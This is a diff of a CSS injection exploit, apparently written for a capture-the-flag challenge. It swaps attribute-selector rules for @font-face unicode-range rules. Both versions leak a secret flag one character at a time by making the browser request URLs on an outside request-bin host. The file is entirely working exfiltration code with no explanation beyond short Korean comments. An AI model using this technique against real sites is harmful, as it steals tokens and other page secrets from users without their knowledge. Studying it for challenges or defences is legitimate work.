@@ -1,45 +1,52 @@
 @import url('http://localhost:8080/flag');
 
-/* FLAG를 input의 value 속성으로 노출 */
 body::after {
     content: var(--flag);
+    font-family: LeakFont;
+    display: block;
+    overflow: hidden;
+    width: 10px; 
+    height: 18px; 
+    white-space: nowrap;
+    text-indent: -60px; 
 }
 
-input[value^="CyKor{0"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{0"); }
-input[value^="CyKor{1"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{1"); }
-input[value^="CyKor{2"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{2"); }
-input[value^="CyKor{3"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{3"); }
-input[value^="CyKor{4"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{4"); }
-input[value^="CyKor{5"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{5"); }
-input[value^="CyKor{6"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{6"); }
-input[value^="CyKor{7"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{7"); }
-input[value^="CyKor{8"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{8"); }
-input[value^="CyKor{9"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{9"); }
+/* 0-9일 경우 */
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=0"); unicode-range: U+0030; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=1"); unicode-range: U+0031; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=2"); unicode-range: U+0032; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=3"); unicode-range: U+0033; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=4"); unicode-range: U+0034; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=5"); unicode-range: U+0035; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=6"); unicode-range: U+0036; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=7"); unicode-range: U+0037; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=8"); unicode-range: U+0038; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=9"); unicode-range: U+0039; }
 
-/* 소문자 a-z */
-input[value^="CyKor{a"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{a"); }
-input[value^="CyKor{b"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{b"); }
-input[value^="CyKor{c"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{c"); }
-input[value^="CyKor{d"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{d"); }
-input[value^="CyKor{e"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{e"); }
-input[value^="CyKor{f"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{f"); }
-input[value^="CyKor{g"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{g"); }
-input[value^="CyKor{h"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{h"); }
-input[value^="CyKor{i"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{i"); }
-input[value^="CyKor{j"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{j"); }
-input[value^="CyKor{k"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{k"); }
-input[value^="CyKor{l"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{l"); }
-input[value^="CyKor{m"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{m"); }
-input[value^="CyKor{n"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{n"); }
-input[value^="CyKor{o"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{o"); }
-input[value^="CyKor{p"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{p"); }
-input[value^="CyKor{q"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{q"); }
-input[value^="CyKor{r"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{r"); }
-input[value^="CyKor{s"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{s"); }
-input[value^="CyKor{t"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{t"); }
-input[value^="CyKor{u"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{u"); }
-input[value^="CyKor{v"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{v"); }
-input[value^="CyKor{w"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{w"); }
-input[value^="CyKor{x"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{x"); }
-input[value^="CyKor{y"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{y"); }
-input[value^="CyKor{z"] { background: url("https://qvctwks.request.dreamhack.games/exfil?flag=CyKor{z"); }
+/* a-z일 경우 */
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=a"); unicode-range: U+0061; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=b"); unicode-range: U+0062; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=c"); unicode-range: U+0063; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=d"); unicode-range: U+0064; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=e"); unicode-range: U+0065; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=f"); unicode-range: U+0066; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=g"); unicode-range: U+0067; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=h"); unicode-range: U+0068; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=i"); unicode-range: U+0069; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=j"); unicode-range: U+006A; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=k"); unicode-range: U+006B; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=l"); unicode-range: U+006C; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=m"); unicode-range: U+006D; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=n"); unicode-range: U+006E; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=o"); unicode-range: U+006F; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=p"); unicode-range: U+0070; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=q"); unicode-range: U+0071; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=r"); unicode-range: U+0072; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=s"); unicode-range: U+0073; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=t"); unicode-range: U+0074; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=u"); unicode-range: U+0075; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=v"); unicode-range: U+0076; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=w"); unicode-range: U+0077; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=x"); unicode-range: U+0078; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=y"); unicode-range: U+0079; }
+@font-face { font-family: LeakFont; src: url("https://qvctwks.request.dreamhack.games/leak?pos=7&char=z"); unicode-range: U+007A; }
